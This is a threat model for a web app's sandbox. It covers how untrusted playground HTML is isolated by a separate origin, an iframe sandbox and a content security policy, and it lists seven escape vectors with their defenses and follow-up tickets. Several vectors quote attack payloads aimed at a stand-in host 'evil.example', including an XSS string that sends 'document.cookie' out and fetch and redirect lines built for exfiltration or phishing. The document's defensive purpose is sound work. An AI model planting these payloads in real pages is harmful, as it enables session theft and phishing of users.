# Threat model — the sandbox boundary and two-origin split

Audit of `tinkerpadai-sandbox-bci.1`. This is the adversarial threat model for the one
place TinkerPad executes untrusted code: a playground. It states the attacker, the trust
boundaries, every escape vector we could construct, the defense that stops each, and the
residual gaps filed as follow-up tickets. The deterministic acceptance for the "demonstrably
fails" claims lives in [`src/web/sandboxEscapeVectors.test.ts`](../src/web/sandboxEscapeVectors.test.ts)
— each vector below names the assertion that pins it.

Read [`design-docs/PROJECT.md`](./PROJECT.md) first: "sandbox everything" and the
single-enforcement-boundary stance are founding constraints, not features. This document
audits how faithfully the code honors them.

## The asset and the attacker

**Asset.** A viewer's session on the *app origin* — the `__Host-tp_session` credential and
everything it authorizes (minting playgrounds as that user). Secondarily: the integrity of
the app UI a viewer sees, and the commons data.

**Attacker.** Any author of a playground. Generation turns an arbitrary description into an
arbitrary self-contained HTML file, and the commons is public by default, so **the playground
HTML, its prompt (which is also the displayed title), its author string, and its tags are all attacker-controlled
text**. The store makes *no* safety claim about the bytes. The attacker's goal is to run code
that reaches off the playground and touches the asset — steal the session, act as the viewer,
deface the app, or exfiltrate.

The attacker does **not** control: TinkerPad's server code, the response headers TinkerPad
sets, or the two hostnames. Those are the boundary.

## The trust boundaries

There are two origins, on purpose, and they are the whole design:

| | App origin (e.g. `app.tinkerpad.example`) | Content origin (e.g. `content.tinkerpad.example`) |
|---|---|---|
| Serves | Trusted chrome: front door, commons, player, session, API | *Only* raw playground HTML, one route (`GET /?id=`) |
| Holds | The `__Host-` session cookie | Nothing — no cookies, no storage of value |
| Code | Authored by TinkerPad | **Authored by the attacker** |
| Enforcer | — | `contentHandler` — the single sandbox enforcer |

The split is realized by `frontDoorRouter`: one fetch entry dispatches by host, and the
content host reaches *only* `contentHandler` — never an app page, session route, or the API.
On Node these are two sockets; on the Worker two routes on one `fetch`. Same invariant either
way. `[LAW:single-enforcer]`

The playground is executed inside that content origin **and** inside a sandboxed iframe framed
by the player: `sandbox="allow-scripts"`, deliberately *without* `allow-same-origin`. So the
framed document runs with a **unique opaque origin** — it is cross-origin to the app, and even
cross-origin to its own content origin's storage.

Three independent layers, any one of which alone defeats most vectors:

- **L1 — foreign origin.** Same-origin policy protects the app even if L2 and L3 failed.
- **L2 — opaque-origin sandbox.** No `allow-same-origin` ⇒ no readable origin; no
  `allow-top-navigation` ⇒ no phishing redirect of the top frame.
- **L3 — content CSP.** `default-src 'none'` + `connect-src 'none'` ⇒ no network, no external
  load; `form-action`/`base-uri 'none'` ⇒ no form post-out, no `<base>` hijack.

## Escape vectors

Each is a concrete thing a hostile playground (or a hostile *prompt*) tries. "Result" is what
actually happens; the named test asserts the enabling condition is absent.

### V1 — Reach the app origin (read app DOM / `window.parent`)
**Attempt:** `top.document.cookie`, `parent.location`, walk the frame tree to the app.
**Defense:** The frame is cross-origin (L1: different host) *and* opaque (L2: no
`allow-same-origin`). SOP throws on any cross-origin property access; there is no readable
handle to the app. **Result: fails.**
**Test:** `frames the playground with sandbox="allow-scripts" and NOT allow-same-origin`.

### V2 — Steal / read the session cookie
**Attempt:** `document.cookie` from the playground; or an XSS on the app origin reading it.
**Defense:** The playground is a foreign, opaque origin — it sees none of the app's cookies.
The cookie itself is `HttpOnly` (unreadable by *any* script, even on the app origin),
`Secure`, `SameSite=Strict` (never sent cross-site — the CSRF defense), host-scoped via the
`__Host-` prefix and no `Domain` (unreachable from the content host by construction).
**Result: fails.**
**Test:** `mints a session cookie that is HttpOnly, SameSite=Strict, Secure, and __Host- scoped`.

### V3 — Hijack the top frame (phishing / clickjacking the viewer)
**Attempt:** `top.location = 'https://evil.example/login'` to redirect the viewer to a
credential-harvesting clone.
**Defense:** `sandbox="allow-scripts"` grants neither `allow-top-navigation` nor
`allow-top-navigation-by-user-activation`, so the framed document cannot navigate the top
browsing context. **Result: fails.**
**Test:** the same sandbox-attribute assertion as V1 (absence of top-navigation tokens).

### V4 — Defeat the content CSP to exfiltrate
**Attempt:** `fetch('https://evil.example', {method:'POST', body: stolen})`, a WebSocket, a
beacon, an `<img src="https://evil…">`, an external `<script>`, a `<form action="https://evil…">`.
**Defense:** `connect-src 'none'` kills fetch/XHR/WebSocket/`sendBeacon`; `default-src 'none'`
with `img-src data: blob:` / `font-src data:` kills every external subresource;
`form-action 'none'` kills form post-out; `base-uri 'none'` kills `<base>` hijack. Every
response from the content origin — success *and* error — carries this CSP plus `nosniff`.
**Result: fails.** *(Residual: see R3 — CSP does not block a self-frame **navigation**; low
severity because the opaque frame has nothing sensitive to carry.)*
**Test:** `seals every content-origin response under the network-denying CSP + nosniff`.

### V5 — Get the app to serve the raw hostile HTML same-origin
**Attempt:** Request the playground id on the *app* host (`app.example/?id=…`) hoping the app
serves the raw bytes into its own origin.
**Defense:** The app host has no raw-HTML route. `GET /?id=…` on the app host returns the
front door page (the `id` is ignored); the raw bytes are reachable *only* on the content host,
where they land in an opaque frame. **Result: fails.**
**Test:** `never serves raw playground bytes on the app origin`.

### V6 — XSS the trusted chrome via playground metadata
**Attempt:** Author a playground whose **prompt/author/tag** is
`"><img src=x onerror="fetch('https://evil?c='+document.cookie)">`. When the player or commons
renders it, the payload executes *on the app origin*, outside the iframe — bypassing the entire
sandbox.
**Defense — two containments, by field:**
- **Free text (prompt, author):** every outside value crossing into app-origin HTML
  passes the single server-side `escapeHtml` enforcer (element + quoted-attribute safe:
  `& < > " '`); the client homepage renders untrusted prompt/author via `textContent`, not
  `innerHTML`. The payload renders as inert text.
- **Tags:** contained one level *earlier* — the branded `Tag()` constructor slugs its input
  (`<script>alert(1)</script>` → `script-alert-1-script`), so a tag **cannot represent** a
  payload by the time it reaches any renderer. Normalization at the type boundary, not
  escaping, is the real defense; escaping tags is then pure defense-in-depth.
  `[LAW:types-are-the-program]`

**Result: fails.**
**Test:** `escapes hostile playground metadata everywhere it renders in trusted chrome`.
> This is the highest-value class in the whole model: the sandbox contains what is *inside*
> it; the metadata rendered *around* it is the soft underbelly. The defense is escaping
> discipline, and it is only as strong as its weakest callsite — hence R1 below.

### V7 — Cross-origin isolation side channels
**Attempt:** Use a popup handle, `SharedArrayBuffer`, or a cross-origin resource read.
**Defense:** The sandbox omits `allow-popups` and `allow-same-origin`, so the frame cannot open
a window that retains a handle nor read any cross-origin resource; no `SharedArrayBuffer`
without cross-origin isolation. **Result: fails** for the framed playground. *(The app origin
is not itself cross-origin-isolated — see R4; not required for this model.)*

## Residual gaps → follow-up tickets

The sandbox and two-origin split are sound. The gaps are **defense-in-depth on the app
origin** — the boundary is whole, but the trusted side ships barer headers than the untrusted
side, which is backwards for the origin that actually holds the asset.

- **R1 — App origin serves no security headers. ✅ CLOSED (`tinkerpadai-sandbox-bci.3`).**
  `siteHandler` now seals *every* response leaving the app origin — pages, the JSON projection,
  the delegated session/API responses (the login page included), AND its error responses — through
  one outermost `harden()`. The handler is TOTAL like the content origin's `sealed()`: a read/
  invariant failure becomes a loud, sealed 500 here rather than propagating unsealed to the origin-
  agnostic runtime edge, so no branch escapes the seal. Headers: `Content-Security-Policy` with
  `frame-ancestors 'self'` + `base-uri 'none'` + `form-action 'self'` + `object-src 'none'`,
  `X-Frame-Options: SAMEORIGIN` (the legacy twin closing clickjacking of login/player),
  `X-Content-Type-Options: nosniff`, and `Referrer-Policy: same-origin`. A full `script-src` is
  deliberately deferred — the app runs inline scripts (index.html, player), so locking it needs
  per-script hashes/nonces and is tracked separately, not landed half-done.
- **R2 — No guard that content origin ≠ app origin.** If `TINKERPAD_CONTENT_ORIGIN` is
  misconfigured to the app host, the split collapses (raw playground HTML same-origin with the
  app). Today a same-host config routes *everything* to the content handler (app dies loudly-ish),
  but there is no explicit assertion the two hosts differ. A deploy-time invariant makes the
  misconfiguration unrepresentable. → `tinkerpadai-sandbox-bci.4`
- **R3 — Content CSP does not block outbound navigation.** `connect-src 'none'` stops fetch/XHR,
  but a playground can still `location = 'https://evil?…'` (self-frame navigation; sandbox
  permits it, `navigate-to` is unshipped). Low severity: the opaque frame holds nothing
  sensitive to exfiltrate, so document + accept. → `tinkerpadai-sandbox-bci.5`
- **R4 — Iframe has no explicit `allow` permissions policy / content origin has no
  `frame-ancestors`.** The opaque frame is already denied powerful features and third-party
  embedding is low-risk (opaque + `connect-src 'none'`), but an explicit `allow=""` on the
  iframe and `frame-ancestors <app-origin>` on the content response make the intent
  machine-enforced rather than implied. → folded into `tinkerpadai-sandbox-bci.5`

## What would break this model

The invariants a future change must not silently regress (each has a red test):

1. The player iframe stays `allow-scripts` **without** `allow-same-origin` or any
   `allow-top-navigation*`. Adding either collapses L2.
2. The content CSP keeps `default-src 'none'` and `connect-src 'none'`.
3. Free-text metadata (prompt/author) stays escaped at every app-origin callsite, and
   tags stay minted through the `Tag()` brand rather than stored raw (V6).
4. The session cookie stays `HttpOnly` + `SameSite=Strict` + `Secure` + `__Host-`.
5. The content host serves nothing but `contentHandler`; raw bytes never appear on the app host.
6. Every app-origin response carries the `harden()` seal — `frame-ancestors 'self'` /
   `X-Frame-Options` (anti-clickjacking), `base-uri`/`form-action`/`object-src`, `nosniff`, and
   `Referrer-Policy` — on *every* branch: the delegated login page and the error 500 included, since
   `siteHandler` is total. Removing the seal, letting a branch bypass it, or making the handler
   throw past it re-opens R1.
